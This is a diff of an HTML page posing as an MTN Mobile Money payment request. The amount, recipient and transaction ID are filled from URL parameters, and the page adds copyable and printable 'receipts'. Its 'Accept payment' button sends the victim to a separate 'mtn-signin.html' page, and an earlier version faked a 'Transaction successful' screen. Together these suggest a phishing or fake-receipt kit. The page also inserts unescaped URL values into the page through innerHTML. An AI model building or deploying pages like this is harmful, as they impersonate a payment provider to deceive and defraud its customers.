@@ -17,6 +17,7 @@
     --mtn-text:  #456BA8;
     --mtn-gray:  #7C8798;
     --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
     --mtn-page:  #E7EEF7;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -34,11 +35,41 @@
     position: relative; overflow: hidden;
   }
 
+  /* ===== Top bar with Copy + Print (fixed at very top) ===== */
+  .toolbar {
+    flex-shrink: 0;
+    background: var(--mtn-white);
+    padding: max(12px, env(safe-area-inset-top, 0px)) 16px 10px;
+    border-bottom: 1px solid var(--mtn-border);
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 10px;
+    z-index: 30;
+  }
+  .tool-btn {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    padding: 11px 12px;
+    font-size: 13px; font-weight: 700;
+    border-radius: 10px;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all .15s;
+    border: 1.5px solid transparent;
+  }
+  .tool-outline {
+    background: var(--mtn-white); color: var(--mtn-royal);
+    border-color: #CBD5E1;
+  }
+  .tool-outline:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
+  .tool-outline.copied { background: var(--mtn-green); border-color: var(--mtn-green); color: #fff; }
+  .tool-primary { background: var(--mtn-royal); color: #fff; border-color: var(--mtn-royal); }
+  .tool-primary:hover { filter: brightness(1.08); }
+
   /* ===== Top blue header ===== */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
-    padding-top: env(safe-area-inset-top, 0px);
+    padding-top: 0;
     padding-bottom: 40px;
     border-bottom-left-radius: 44% 48px;
     border-bottom-right-radius: 44% 48px;
@@ -46,12 +77,12 @@
   .brand {
     display: inline-flex; align-items: baseline; gap: 2px;
     font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
-    padding: 22px 24px 0;
+    padding: 18px 24px 0;
   }
   .brand .mtn { color: var(--mtn-yellow); }
   .brand .mm  { color: #FFFFFF; opacity: 0.95; }
 
-  /* ===== Circular illustration (always visible) ===== */
+  /* ===== Circular illustration ===== */
   .hero {
     position: absolute; left: 50%; transform: translateX(-50%);
     bottom: -120px; width: 68%; max-width: 280px; aspect-ratio: 1 / 1;
@@ -74,43 +105,44 @@
   /* ===== Body ===== */
   .body {
     flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
-    padding: 150px 24px 24px;
+    padding: 150px 22px 20px;
     display: flex; flex-direction: column; align-items: center; text-align: center;
   }
 
-  /* Heading swaps between request and success */
-  .headline {
-    font-size: 26px; font-weight: 700; letter-spacing: -0.4px;
-    color: var(--mtn-text); margin-bottom: 14px; line-height: 1.2;
+  /* Status block just below circle */
+  .status-block { margin-bottom: 18px; }
+  .status-title {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.4px;
+    color: var(--mtn-text); line-height: 1.25; margin-bottom: 5px;
+  }
+  .status-desc {
+    font-size: 12.5px; color: var(--mtn-gray); line-height: 1.55;
+    max-width: 300px; margin: 0 auto;
+  }
+  .status-ref {
+    font-size: 11.5px; color: var(--mtn-gray); margin-top: 8px;
+    font-weight: 500;
+  }
+  .status-ref .ref-id {
+    font-family: "SF Mono", Monaco, monospace; font-size: 11px;
+    background: var(--mtn-soft); padding: 2px 7px; border-radius: 5px;
+    border: 1px solid var(--mtn-border); color: var(--mtn-text);
   }
 
-  /* Amount block shown before accept */
+  /* Amount */
   .amount-block {
     display: flex; align-items: baseline; justify-content: center; gap: 6px;
-    margin-bottom: 16px;
+    margin-bottom: 14px;
   }
-  .amount-block .cur {
-    font-size: 18px; font-weight: 700; color: var(--mtn-royal);
-  }
+  .amount-block .cur { font-size: 18px; font-weight: 700; color: var(--mtn-royal); }
   .amount-block .val {
     font-size: 40px; font-weight: 800; letter-spacing: -1.5px;
     color: var(--mtn-deep); line-height: 1;
   }
 
-  /* Transaction detail line (success view) */
-  .tx-line {
-    font-size: 17px; color: var(--mtn-gray); line-height: 1.55;
-    max-width: 320px; margin: 0 auto; word-break: break-word;
-  }
-  .tx-line .amount { font-weight: 600; color: var(--mtn-text); }
-  .tx-line .recv-name {
-    display: block; font-weight: 700; color: var(--mtn-text);
-    margin-top: 3px; word-break: break-word;
-  }
-
-  /* Accept payment button — the main action on request state */
+  /* Accept button */
   .btn-accept {
-    margin-top: 8px;
+    margin-top: 4px;
     padding: 15px 34px;
     font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
     background: var(--mtn-green); color: #fff;
@@ -124,65 +156,50 @@
   .btn-accept:active { transform: scale(0.98); }
   .btn-accept:disabled { opacity: 0.7; cursor: wait; }
 
-  /* Recipient name under accept button (request state) */
+  /* Recipient */
   .recipient-line {
-    margin-top: 18px;
-    font-size: 14px; color: var(--mtn-gray);
-    line-height: 1.5; max-width: 300px;
+    margin-top: 16px;
+    font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
   }
   .recipient-line .recv-name {
     display: block; font-weight: 700; color: var(--mtn-text);
-    font-size: 15px; margin-top: 2px; word-break: break-word;
+    font-size: 14.5px; margin-top: 2px; word-break: break-word;
   }
 
-  /* Share receipt (success only) */
-  .share-receipt {
-    margin-top: 26px;
-    display: none;
-    align-items: center; gap: 10px;
-    background: transparent; border: none; cursor: pointer;
-    font-family: inherit; color: var(--mtn-text);
-    font-size: 16px; font-weight: 600; padding: 8px 6px;
-    border-radius: 10px; transition: transform .12s ease;
+  /* Details */
+  .details-panel {
+    width: 100%; margin-top: 20px;
+    background: var(--mtn-soft); border-radius: 12px;
+    padding: 4px 14px; text-align: left;
   }
-  .share-receipt.show { display: inline-flex; }
-  .share-receipt:hover { transform: translateY(-1px); }
-  .share-receipt:active { transform: scale(0.98); }
-  .share-receipt .share-icon {
-    width: 34px; height: 34px; border-radius: 50%;
-    background: var(--mtn-yellow);
-    display: inline-flex; align-items: center; justify-content: center;
-    box-shadow: 0 4px 10px rgba(255, 214, 0, 0.35); flex-shrink: 0;
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    gap: 12px; padding: 9px 0;
+    border-bottom: 1px solid #E9EDF4;
   }
-  .share-receipt .share-icon svg {
-    width: 18px; height: 18px; stroke: var(--mtn-royal); fill: none;
-    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { font-size: 11px; color: var(--mtn-gray); flex-shrink: 0; }
+  .detail-row .v {
+    font-size: 11.5px; font-weight: 600; text-align: right;
+    word-break: break-word; color: var(--mtn-text);
   }
-  .share-receipt .share-icon svg circle { fill: var(--mtn-royal); stroke: none; }
+  .detail-row .v.mono {
+    font-family: "SF Mono", Monaco, monospace;
+    font-size: 10.5px; background: #fff; padding: 2px 7px;
+    border-radius: 4px; border: 1px solid var(--mtn-border);
+  }
 
-  /* ===== Bottom bar ===== */
-  .bottom {
-    flex-shrink: 0; background: var(--mtn-white);
-    padding: 12px 16px calc(18px + env(safe-area-inset-bottom, 0px));
-    border-top: 1px solid rgba(7, 58, 135, 0.06);
-    display: flex; justify-content: center;
+  /* Support */
+  .support-line {
+    margin-top: 16px;
+    font-size: 11px; color: var(--mtn-gray); line-height: 1.6;
+    text-align: center;
   }
-  .done-btn {
-    width: 100%; max-width: 380px; height: 76px;
-    background: var(--mtn-royal); color: #fff;
-    font-family: inherit; font-size: 17px; font-weight: 800;
-    letter-spacing: 2px; text-transform: uppercase;
-    border: none; border-radius: 999px; cursor: pointer;
-    box-shadow: 0 12px 26px rgba(32, 89, 181, 0.35);
-    transition: transform .1s ease, filter .15s ease;
-  }
-  .done-btn:hover { filter: brightness(1.06); }
-  .done-btn:active { transform: scale(0.985); }
-  .done-btn:disabled { opacity: 0.7; cursor: wait; }
+  .support-line strong { color: var(--mtn-text); font-weight: 700; }
 
   /* Toast */
   .toast {
-    position: fixed; bottom: 100px; left: 50%;
+    position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
     background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
@@ -190,39 +207,47 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* Small phones */
+  /* Print — receipt only */
+  @media print {
+    body { background: #fff; padding: 0; }
+    .toolbar, .brand, .support-line { display: none !important; }
+    .phone { box-shadow: none; }
+    .top { background: #fff; border-bottom: 1px solid #ccc; padding: 12px 0; }
+    .body { padding-top: 130px; }
+    .btn-accept { display: none !important; }
+  }
+
+  /* Small screens */
   @media (max-width: 380px) {
-    .brand { font-size: 16px; padding: 18px 20px 0; }
+    .tool-btn { padding: 10px; font-size: 12px; }
+    .brand { font-size: 16px; padding: 14px 20px 0; }
     .top { padding-bottom: 32px; border-bottom-left-radius: 42% 42px; border-bottom-right-radius: 42% 42px; }
     .hero { width: 64%; bottom: -100px; }
-    .body { padding: 130px 20px 20px; }
-    .headline { font-size: 22px; }
+    .body { padding: 130px 18px 18px; }
+    .status-title { font-size: 18px; }
     .amount-block .val { font-size: 34px; }
-    .tx-line { font-size: 15px; }
     .btn-accept { padding: 13px 28px; font-size: 14px; min-width: 190px; }
-    .done-btn { height: 66px; font-size: 15px; letter-spacing: 1.5px; }
   }
 
   /* Short screens */
   @media (max-height: 680px) {
     .hero { width: 56%; bottom: -84px; }
     .body { padding-top: 108px; }
-    .headline { font-size: 22px; }
+    .status-title { font-size: 18px; }
     .amount-block .val { font-size: 32px; }
-    .done-btn { height: 64px; font-size: 15px; }
+    .details-panel { margin-top: 16px; }
   }
 
-  /* Tablet and desktop */
+  /* Tablet / desktop */
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
     .phone {
-      min-height: calc(100vh - 64px); max-height: 880px;
+      min-height: calc(100vh - 64px); max-height: 900px;
       border-radius: 32px;
       box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
       overflow: hidden;
     }
-    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; padding-top: 0; }
-    .bottom { border-bottom-left-radius: 32px; border-bottom-right-radius: 32px; }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
   }
 </style>
 </head>
@@ -230,11 +255,21 @@
 
 <div class="phone">
 
-  <!-- Blue header with brand -->
+  <!-- Copy + Print toolbar (top of page) -->
+  <div class="toolbar">
+    <button class="tool-btn tool-outline" id="copyBtn" onclick="copyReceipt()">
+      <span>📋</span> <span id="copyLbl">Copy Receipt</span>
+    </button>
+    <button class="tool-btn tool-primary" onclick="window.print()">
+      <span>🖨</span> Print
+    </button>
+  </div>
+
+  <!-- Blue header -->
   <div class="top">
     <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
 
-    <!-- Circular illustration always visible -->
+    <!-- Circle illustration -->
     <div class="hero" aria-hidden="true">
       <div class="outer"></div>
       <div class="green-ring">
@@ -274,48 +309,38 @@
     </div>
   </div>
 
-  <!-- Scrollable body -->
+  <!-- Body -->
   <div class="body">
 
-    <h1 class="headline" id="headline">Amount to pay</h1>
+    <!-- Status block -->
+    <div class="status-block">
+      <div class="status-title">Payment Request Received</div>
+      <div class="status-desc">Please review the details below and confirm the payment.</div>
+      <div class="status-ref" id="statusRef"></div>
+    </div>
 
-    <div class="amount-block" id="amountBlock">
+    <!-- Amount -->
+    <div class="amount-block">
       <span class="cur" id="amtCur">—</span>
       <span class="val" id="amtVal">0.00</span>
     </div>
 
-    <!-- Accept button on request state -->
+    <!-- Accept -->
     <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Accept payment</button>
 
-    <!-- Recipient info on request state -->
-    <div class="recipient-line" id="recipientLine">
+    <!-- Recipient -->
+    <div class="recipient-line">
       To
       <span class="recv-name" id="reqRecipient">—</span>
     </div>
 
-    <!-- Success view -->
-    <div class="tx-line" id="txLine" style="display:none;">
-      You sent <span class="amount" id="txAmount">—</span> to
-      <span class="recv-name" id="txRecipient">—</span>
+    <!-- Details -->
+    <div class="details-panel" id="detailsPanel"></div>
+
+    <!-- Support -->
+    <div class="support-line" id="supportLine">
+      Need help? Contact MTN support on <strong id="supportNum">—</strong>.
     </div>
-
-    <button class="share-receipt" id="shareBtn" type="button" onclick="shareReceipt()">
-      <span class="share-icon">
-        <svg viewBox="0 0 24 24" aria-hidden="true">
-          <circle cx="6"  cy="12" r="2.6"/>
-          <circle cx="18" cy="6"  r="2.6"/>
-          <circle cx="18" cy="18" r="2.6"/>
-          <line x1="8.4" y1="10.8" x2="15.6" y2="7.2"/>
-          <line x1="8.4" y1="13.2" x2="15.6" y2="16.8"/>
-        </svg>
-      </span>
-      Share receipt
-    </button>
-  </div>
-
-  <!-- Bottom Done bar (hidden until success) -->
-  <div class="bottom" id="bottomBar" style="display:none;">
-    <button class="done-btn" id="doneBtn" onclick="finish()">Done</button>
   </div>
 </div>
 
@@ -338,6 +363,14 @@
     } catch (e) { return n + ' ' + (currency || ''); }
   }
 
+  /* ---------- MTN support numbers ---------- */
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787',
+    'Zambia': '111',
+    'Uganda': '100',
+    'Ghana': '100'
+  };
+
   /* ---------- Data from URL ---------- */
   const params = new URLSearchParams(location.search);
   const tx = {
@@ -351,7 +384,13 @@
     mk:  params.get('mk')  || ''
   };
 
-  /* ---------- Helpers ---------- */
+  function formatDate(ts) {
+    const d = ts ? new Date(ts) : new Date();
+    return d.toLocaleString(undefined, {
+      day: '2-digit', month: 'short', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+  }
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
@@ -359,112 +398,95 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ---------- Fill request view ---------- */
+  /* ---------- Fill page ---------- */
   document.getElementById('amtCur').textContent = tx.cur || '';
   document.getElementById('amtVal').textContent = Number(tx.am || 0).toFixed(2);
   document.getElementById('reqRecipient').textContent = tx.rn || '—';
 
-  /* ---------- Accept ---------- */
-  let accepting = false;
-  async function acceptPayment() {
-    if (accepting) return;
-    accepting = true;
+  const refEl = document.getElementById('statusRef');
+  if (tx.ref) {
+    refEl.innerHTML = 'Transaction <span class="ref-id">' + tx.ref + '</span> · ' + formatDate();
+  } else {
+    refEl.textContent = formatDate();
+  }
+
+  const details = [
+    { k: 'Country',        v: tx.c },
+    { k: 'Transaction ID', v: tx.ref, mono: true },
+    { k: 'Date',           v: formatDate() },
+    { k: 'Method',         v: tx.pm },
+    { k: 'Service',        v: tx.sn },
+    { k: 'Marketed',       v: tx.mk },
+    { k: 'Status',         v: 'Payment Request Received' }
+  ];
+  let html = '';
+  details.forEach(r => {
+    if (!r.v && r.v !== 0) return;
+    const cls = r.mono ? 'mono' : '';
+    html += `<div class="detail-row"><span class="k">${r.k}</span><span class="v ${cls}">${r.v}</span></div>`;
+  });
+  document.getElementById('detailsPanel').innerHTML = html;
+
+  const supportNum = SUPPORT_NUMBERS[tx.c];
+  if (supportNum) {
+    document.getElementById('supportNum').textContent = supportNum;
+  } else {
+    document.getElementById('supportLine').style.display = 'none';
+  }
+
+  /* ---------- Copy receipt ---------- */
+  function copyReceipt() {
+    const lines = [
+      'MTN Mobile Money — Payment Request',
+      '----------------------------------',
+      'Status: Payment Request Received',
+      'Amount: ' + (tx.cur || '') + ' ' + Number(tx.am || 0).toFixed(2),
+      'Recipient: ' + (tx.rn || ''),
+      'Country: '   + (tx.c || ''),
+      'Transaction ID: ' + (tx.ref || ''),
+      'Payment method: ' + (tx.pm || ''),
+      'Date: ' + formatDate()
+    ].join('\n');
+
+    const btn = document.getElementById('copyBtn');
+    const lbl = document.getElementById('copyLbl');
+    const done = () => {
+      btn.classList.add('copied');
+      lbl.textContent = 'Copied ✓';
+      showToast('Receipt copied to clipboard.');
+      setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = 'Copy Receipt'; }, 1800);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
+    } else { fallbackCopy(lines); done(); }
+  }
+  function fallbackCopy(text) {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  /* ---------- Accept → navigate to sign-in page ---------- */
+  function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
     btn.disabled = true;
-    btn.textContent = 'Processing…';
+    btn.textContent = 'Redirecting…';
 
-    try {
-      await fetch('/api/accept', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          transactionId: tx.ref,
-          phone: '',
-          pin: '0000',
-          method: 'mtn'
-        })
-      });
-    } catch (e) { /* proceed to success UI */ }
-
-    showSuccess();
-  }
-
-  function showSuccess() {
-    // Swap headline
-    document.getElementById('headline').textContent = 'Transaction successful';
-
-    // Swap amount block for the success message
-    document.getElementById('amountBlock').style.display = 'none';
-    document.getElementById('recipientLine').style.display = 'none';
-    document.getElementById('acceptBtn').style.display = 'none';
-
-    const line = document.getElementById('txLine');
-    line.style.display = 'block';
-    document.getElementById('txAmount').textContent = formatAmount(tx.am, tx.cur);
-    document.getElementById('txRecipient').textContent = tx.rn || '—';
-
-    // Show share + done
-    document.getElementById('shareBtn').classList.add('show');
-    document.getElementById('bottomBar').style.display = 'flex';
-  }
-
-  /* ---------- Share ---------- */
-  function receiptText() {
-    return [
-      'MTN Mobile Money — Transaction successful',
-      '----------------------------------------',
-      'You sent ' + formatAmount(tx.am, tx.cur) + ' to',
-      tx.rn || 'Recipient',
-      '',
-      'Reference: ' + (tx.ref || '—'),
-      'Country: '   + (tx.c || '—'),
-      'Status: Success',
-      'Date: '      + new Date().toLocaleString()
-    ].join('\n');
-  }
-  async function shareReceipt() {
-    const text = receiptText();
-    const btn = document.getElementById('shareBtn');
-    btn.disabled = true;
-    try {
-      if (navigator.share) {
-        await navigator.share({ title: 'MTN Mobile Money receipt', text });
-        showToast('Receipt shared.');
-      } else if (navigator.clipboard && navigator.clipboard.writeText) {
-        await navigator.clipboard.writeText(text);
-        showToast('Receipt copied to clipboard.');
-      } else {
-        downloadReceipt(text);
-        showToast('Receipt downloaded.');
-      }
-    } catch (e) {
-      if (e && e.name !== 'AbortError') showToast('Could not share receipt.');
-    } finally { btn.disabled = false; }
-  }
-  function downloadReceipt(text) {
-    const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = 'mtn-receipt-' + (tx.ref || Date.now()) + '.txt';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-    setTimeout(() => URL.revokeObjectURL(url), 4000);
-  }
-
-  /* ---------- Done ---------- */
-  let finished = false;
-  function finish() {
-    if (finished) return;
-    finished = true;
-    const btn = document.getElementById('doneBtn');
-    btn.disabled = true;
-    btn.textContent = 'Done ✓';
+    const q = new URLSearchParams({
+      tx:  tx.ref,
+      am:  tx.am,
+      cur: tx.cur,
+      rn:  tx.rn,
+      c:   tx.c,
+      pm:  tx.pm,
+      sn:  tx.sn,
+      mk:  tx.mk
+    });
     setTimeout(() => {
-      if (history.length > 1) history.back();
-      else window.location.href = '/';
-    }, 220);
+      window.location.href = 'mtn-signin.html?' + q.toString();
+    }, 250);
   }
 </script>
 </body>
